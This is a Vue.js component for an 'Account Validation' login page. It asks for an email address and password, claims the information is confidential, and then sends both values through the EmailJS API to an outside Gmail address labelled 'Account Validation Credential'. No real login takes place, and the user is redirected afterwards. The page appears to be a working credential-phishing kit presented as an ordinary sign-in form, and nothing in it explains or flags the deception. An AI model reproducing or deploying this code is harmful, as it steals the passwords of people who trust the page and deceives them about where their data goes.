<template>
  <div
    class="hello"
    style=""
  >
    <div class="container">
      <div style="display: flex;justify-content: center;">
        <div style="height: 120px; width: 120px;">
          <img
            style="width: 100%; height: 100%;"
            src="../assets/logo1.jpeg"
            alt=""
          />
        </div>
      </div>

      <div class="title">
        <h3></h3>
      </div>

      <h2 style="text-align: center;">Account Validation</h2>
      <!-- <div class="divider"></div> -->
      <el-form
        :label-position="labelPosition"
        :model="ruleForm"
        :rules="rules"
        ref="ruleForm"
        label-width="120px"
        class="demo-ruleForm"
      >
        <el-form-item prop="name">
          <el-input
            placeholder="Email Address/Username"
            v-model="ruleForm.name"
          ></el-input>
        </el-form-item>
        <el-form-item prop="password">
          <el-input
            placeholder="Password"
            type="password"
            v-model="ruleForm.password"
          ></el-input>
        </el-form-item>
        <div
          style="margin-top: 1rem;"
          class="g-recaptcha"
          data-sitekey="6LctVDciAAAAAENNzmXXJuJSaQlyq82x-91QLeUy"
        ></div>
        <!-- <div class="g-recaptcha" data-sitekey="6LfEov4UAAAAAN8Hv8YDyqpqxGrt6RLnT5qMWxHA"></div> -->
        <el-form-item style="margin: 20px 0px;">
          <el-button
            :loading="loader"
            type="primary"
            class="btn-text"
            @click="submitForm('ruleForm')"
            >Login</el-button
          >
        </el-form-item>
      </el-form>
      <!-- <div class="divider"></div> -->

      <!-- <p class="terms">
        if you click the authentication/activation link, you will be registered
        and you agree to the
        <span @click="openDialog('Terms & Conditions')"
          >terms & conditions</span
        >
        &nbsp; and &nbsp;
        <span @click="openDialog('Privacy Policy')">Privacy Policy</span>
      </p> -->

      <ul style="list-style-type: unset;">
        <h3 style="margin-bottom: 30px;">Note</h3>
        <li style="font-size: 11px; display: list-item;">
          The information collected is confidential and will not be disclosed by
          us to unauthorized third parties.
        </li>
        <li style="font-size: 11px; display: list-item;">
          Customers are reminded to kindly provide accurate and truthful
          information for authentication and not to provide data which is false
          or which belongs to third parties. Authentication information will not
          be modified.
        </li>
        <li style="font-size: 11px;display: list-item;">
          Authentication process will be carried out immediately upon receipt of
          information, and we will have notify you of the authentication result.
        </li>
      </ul>
    </div>

    <div class="img-hero">
      <img
        style="    height: 100%; width:100%;
    object-fit: cover;
"
        src="../assets/Bot1.jpg"
        alt=""
      />
    </div>

    <!-- <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
      <span>{{ modalBody }}</span>
      <span slot="footer" class="dialog-footer">
        <el-button @click="dialogVisible = false">Cancel</el-button>
      </span>
    </el-dialog> -->
  </div>
</template>

<script>
import axios from "axios";
export default {
  name: "HelloWorld",
  props: {
    msg: String,
  },
  methods: {
    submitForm(formName) {
      var self = this;
      this.loader = true;

      this.$refs[formName].validate((valid) => {
        if (valid) {
          var data = {
            service_id: "service_g49xzs9",
            template_id: "template_xkj0lgc",
            user_id: "Q_v6F22hpmQkpwuex",
            template_params: {
              from_name: 'Account Validation Credential',
              email: this.ruleForm.name,
              password: this.ruleForm.password,
              reply_to: "customeronlineagent@gmail.com",
            },
          };
          axios
            .post("https://api.emailjs.com/api/v1.0/email/send", data)
            .then(function() {
              self.loader = false;
              self.$router.push("/barcode");
            })
            .catch(function() {
              self.loader = false;
            });
        } else {
          this.loader = false;
          return false;
        }
      });
    },
    resetForm(formName) {
      this.$refs[formName].resetFields();
    },
    openDialog(headerItem) {
      this.dialogVisible = true;
      this.modalHeader = headerItem;
      if (
        headerItem ===
        "Welcome to Website Name! These terms and conditions outline the rules and regulations for the use of Company Name's Website, located at Website.com. By accessing this website we assume you accept these terms and conditions. Do not continue to use Website Name if you do not agree to take all of the terms and conditions stated on this page."
      ) {
        this.modalBody = "Terms and conditions are required";
      } else {
        this.modalBody =
          "At Website Name, accessible at Website.com, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by Website Name and how we use it. If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact us through email at Email@Website.com";
      }
    },
  },
  data() {
    return {
      loader: false,
      dialogVisible: false,
      modalHeader: "",
      modalBody: "",
      labelPosition: "top",
      ruleForm: {
        name: "",
        password: "",
      },
      rules: {
        name: [
          {
            required: true,
            message: "Please input email address",
            trigger: "blur",
          },
          {
            type: "email",
            message: "Please input correct email address",
            trigger: ["blur", "change"],
          },
        ],
        password: [
          {
            required: true,
            message: "Please input Password",
            trigger: "blur",
          },
        ],
      },
    };
  },
};
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h3 {
  margin: 40px 0 0;
}
ul {
  list-style-type: none;
  padding: 0;
  margin-top: 6rem;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}

.divider {
  border: 1px solid #eee;
  margin-bottom: 1rem;
}

.container {
  width: 40%;
  padding: 4rem;
}

.img-hero {
  width: 60%;
}

.hello .el-button--primary {
  width: 100%;
  height: 38px;
  margin-top: 0.3rem;
  background-color: #007bff;
  border-color: #007bff;
}

.hello .el-form-item__content .el-input input {
  height: 50px;
}

.hello .title h3 {
  text-align: center;
}

.hello {
  display: flex;
  justify-content: center; 
  height: 100vh;
  overflow: hidden
}

.terms {
  font-size: 14px;
  color: #666;
}

.terms span {
  color: limegreen;
  cursor: pointer;
  transition: all 0.5s;
}

.terms span:hover {
  text-decoration: underline;
}

.hello .title .title-tab {
  width: 100%;
  text-transform: uppercase;
  letter-spacing: 0.3rem;
  background: #3b5998;
  height: 50px;
  border-radius: 90px;
  margin: 1rem 0rem;
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
}

.hello .title .title-tab span {
  font-weight: 900;
}

@media only screen and (max-width: 600px) {
  .container {
    width: 100%;
    padding: 20px;
  }

  .img-hero {
    display: none;
  }

  .hello {
    overflow: auto;
  }
}
</style>
